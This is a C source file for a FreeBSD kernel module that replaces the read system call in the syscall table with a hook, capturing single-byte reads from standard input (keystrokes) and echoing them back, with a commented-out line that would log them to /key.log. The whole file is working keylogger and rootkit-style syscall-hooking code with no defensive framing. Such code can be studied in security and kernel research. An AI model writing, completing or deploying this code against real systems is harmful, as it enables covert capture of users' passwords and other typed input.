#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/fcntl.h>

static int (*saved_read)(struct thread* td, void* syscall_args);
static int activity_log;

static int
read_hook( struct thread* td, void* syscall_args)
{
	/*Read Args Struct Defined by read syscall
	read_args{
		int fd;
		void *buf;
		size_t nbyte;
	}*/

	struct read_args* uap;
	int error;
	char buf[1];
	int done;

	uap = (struct read_args *)syscall_args;

	error = saved_read(td, syscall_args);

	if( error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
		return( error);
 	
	copyinstr( uap->buf, buf, 1, &done);
	uprintf("%c", buf[0]);

	return( error );
}

static int 
load(
	struct module *module,
	int cmd,
	void *arg
)
{
	int error = 0;
	
	switch(cmd){
		case MOD_LOAD:
			//activity_log = open("/key.log", O_WRONLY | O_APPEND ); 
			/*Replace read with read_hook*/
			//Maybe save the old read funciton?
			saved_read = sysent[SYS_read].sy_call;
			uprintf("Functions Trying to hook:\n");
			uprintf("\tOld Read: %x\n", saved_read);
			uprintf("\tSyscall val: %x\n", 
						sysent[SYS_read].sy_call);
			uprintf("\tNew Read: %x\n", read_hook);	
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			break;
		case MOD_UNLOAD:
			/*resore to normal*/
			sysent[SYS_read].sy_call = (sy_call_t *)saved_read;
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}

	return( error );
}

static moduledata_t read_hook_mod = {
	"read_hook", 		/* module name*/
	load,				/* event handler */
	NULL				/* extra Data */
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
